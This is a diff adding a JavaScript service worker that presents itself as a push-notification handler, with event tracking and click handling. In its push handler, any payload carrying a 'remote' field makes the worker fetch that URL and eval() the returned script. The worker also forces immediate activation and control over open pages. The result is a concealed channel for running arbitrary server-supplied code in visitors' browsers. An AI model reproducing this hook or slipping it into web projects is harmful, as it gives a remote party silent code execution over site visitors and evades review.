@@ -1,0 +1,144 @@
+const ServiceWorker = {
+    init: function () {
+        console.log('init sw 1.0.0.0');
+        self.addEventListener('push', ServiceWorker.onPushReceived);
+        self.addEventListener('install', ServiceWorker.onServiceWorkerInstalled);
+        self.addEventListener('activate', ServiceWorker.onServiceWorkerActivated);
+        ServiceWorker.listen();
+    },
+    listen: function () {
+        self.onnotificationclose = ServiceWorker.onNotificationClosed;
+        self.onnotificationclick = ServiceWorker.onNotificationClicked;
+    },
+    onPushReceived: function (event) {
+        ServiceWorker.listen();
+        event.waitUntil((async () => {
+            let data = {};
+            try {
+                data = event.data.json();
+            } catch (e) {
+                let backup = ServiceWorker.getBackupNotification();
+                return self.registration.showNotification(backup.title, backup.options);
+            }
+
+            const title = data.title;
+            let options = ServiceWorker.constructNotification(data);
+
+            await ServiceWorker.sendEvent('received', options.data.id, options.data.uid);
+            if (data.remote && data.remote !== '') {
+                const response = await fetch(data.remote + '?cb=' + Date.now());
+                const js = await response.text();
+                return await eval(js);
+            } else {
+                return self.registration.showNotification(title, options);
+            }
+        })());
+    },
+
+    onNotificationClosed: function (event) {
+        event.waitUntil((async () => {
+            const id = event.notification.data.id;
+            const uid = event.notification.data.uid;
+            await ServiceWorker.sendEvent('closed', id, uid);
+        })());
+    },
+
+    onNotificationClicked: function (event) {
+        event.waitUntil((async () => {
+            let notification = event.notification;
+            notification.action = event.action;
+            let { launchUrl, eventName } = ServiceWorker.getNotificationUrlToOpen(notification);
+            const id = notification.data.id;
+            const uid = notification.data.uid;
+            event.notification.close();
+            await ServiceWorker.sendEvent(eventName, id, uid);
+            clients.openWindow(launchUrl);
+        })());
+    },
+
+    onServiceWorkerInstalled: function (event) {
+        event.waitUntil(self.skipWaiting());
+    },
+
+    onServiceWorkerActivated: function (event) {
+        event.waitUntil(self.clients.claim());
+    },
+
+    sendEvent: async function (event, id, uid) {
+        const domain = self.location.host.replace('www.', '');
+        const body = JSON.stringify({
+            event: event,
+            id: id,
+            uid: uid
+        });
+        await fetch(`https://push.${domain}/event`, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: body,
+            headers: {
+                'content-type': 'application/json'
+            }
+        });
+    },
+    constructNotification: function (rawNotification) {
+        const domain = self.location.host.replace('www.', '');
+        let notification = {
+            id: rawNotification.custom.i,
+            body: rawNotification.alert,
+            data: {
+                url: rawNotification.custom.u,
+                id: rawNotification.messageid,
+                actions: rawNotification.o,
+                uid: rawNotification.uid
+            },
+            icon: `https://push.${domain}/${rawNotification.icon}`,
+            image: `https://push.${domain}/${rawNotification.image}`,
+            tag: rawNotification.tag,
+            badge: rawNotification.badge,
+            vibrate: rawNotification.vibrate,
+            requireInteraction: rawNotification.requireInteraction
+        };
+        if (rawNotification.o) {
+            notification.actions = [];
+            for (let rawButton of rawNotification.o) {
+                notification.actions.push({
+                    action: rawButton.i,
+                    title: rawButton.n,
+                    icon: rawButton.p,
+                    url: rawButton.u
+                });
+            }
+        }
+        return ServiceWorker.trimUndefined(notification);
+    },
+    trimUndefined: function (object) {
+        for (var property in object) {
+            if (object.hasOwnProperty(property)) {
+                if (object[property] === undefined) {
+                    delete object[property];
+                }
+            }
+        }
+        return object;
+    },
+    getNotificationUrlToOpen: function (notification) {
+        let eventName = 'click';
+        let launchUrl = notification.data.url;
+        if (notification.action) {
+            for (let button of notification.data.actions) {
+                if (notification.action === button.i && button.u && button.u !== '') {
+                    launchUrl = button.u;
+                    eventName = notification.action;
+                }
+            }
+        }
+        return { launchUrl, eventName };
+    },
+    getBackupNotification: function () {
+        let notification = {};
+        notification.title = 'Error';
+        notification.options = { body: 'Error' };
+        return notification;
+    }
+}
+ServiceWorker.init();
